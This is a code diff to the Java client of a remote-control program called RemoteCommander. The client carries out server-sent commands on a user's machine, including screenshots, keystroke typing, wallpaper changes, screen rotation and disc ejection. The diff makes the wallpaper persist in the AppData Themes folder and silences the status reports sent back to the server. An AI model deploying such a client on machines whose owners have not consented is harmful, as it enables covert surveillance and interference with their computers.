@@ -5,6 +5,11 @@ import static com.github.connorf.RemoteCommander.CommandConstants.*;
 import java.awt.*;
 import java.io.*;
 import java.net.Socket;
+import java.net.URI;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.Paths;
+import java.nio.file.StandardCopyOption;
 
 /**
  * the program that runs on each clients machine. The com.github.connorf.RemoteCommander.Client class
@@ -81,6 +86,10 @@ public class Client
         switch(serverCommand[0].toLowerCase())
         {
             case CMD_EJECT:
+//                if(commandSet.eject())
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_EJECT);
+//                else
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_EJECT);
                 commandSet.eject();
                 return;
             case CMD_WALLPAPER:
@@ -90,6 +99,10 @@ public class Client
                 processSoundCommand(serverCommand[1], serverCommand[2]);
                 return;
             case CMD_SCREENSHOT:
+//                if(commandSet.takeScreenshot())
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_SCREENSHOT);
+//                else
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_SCREENSHOT);
                 commandSet.takeScreenshot();
                 return;
             case CMD_MSG:
@@ -105,6 +118,10 @@ public class Client
                 commandSet.chaos(Long.valueOf(serverCommand[1]), Long.valueOf(serverCommand[2]));
                 break;
             case CMD_TYPE:
+//                if(commandSet.type(serverCommand[1]))
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_TYPE);
+//                else
+//                    commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_TYPE);
                 commandSet.type(serverCommand[1]);
                 break;
             case CMD_RETRIEVE:
@@ -116,7 +133,13 @@ public class Client
                 break;
             case CMD_ROTATE:
                 if(serverCommand[1].equals(DIR_NORMAL) || serverCommand[1].equals(DIR_INVERTED) || serverCommand[1].equals(DIR_LEFT) || serverCommand[1].equals(DIR_RIGHT))
+                {
+//                    if(commandSet.rotate(serverCommand[1]))
+//                        commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_ROTATE);
+//                    else
+//                        commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_ROTATE);
                     commandSet.rotate(serverCommand[1]);
+                }
                 break;
             case CMD_MINIMISE:
                 commandSet.minimise();
@@ -187,6 +210,8 @@ public class Client
         {
             int fileSize = Integer.valueOf(size);
             File image = commandSet.getFileFromServer(fileSize, "wal", type);
+            File movedImage = new File("C:\\Users\\" + System.getProperty("user.name") + "\\AppData\\Local\\Microsoft\\Windows\\Themes\\");
+            Files.copy(image.toPath(), movedImage.toPath(), StandardCopyOption.REPLACE_EXISTING); // move the transferred wallpaper over to a place it won't get deleted (so the wallpaper stays after restart)
             success = commandSet.setWallpaper(image);
             image.deleteOnExit();
         }
@@ -197,9 +222,9 @@ public class Client
             success = false;
         }
 
-        if(success) // notify the server of success / failure of changing the wallpaper
-            commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_WALLPAPER);
-        else
-            commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_WALLPAPER);
+//        if(success) // notify the server of success / failure of changing the wallpaper
+//            commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Success: " + CMD_WALLPAPER);
+//        else
+//            commandSet.sendStringToServer("[" + socket.getInetAddress().toString().replace("/", "") + "] Failure: " + CMD_WALLPAPER);
     }
 }
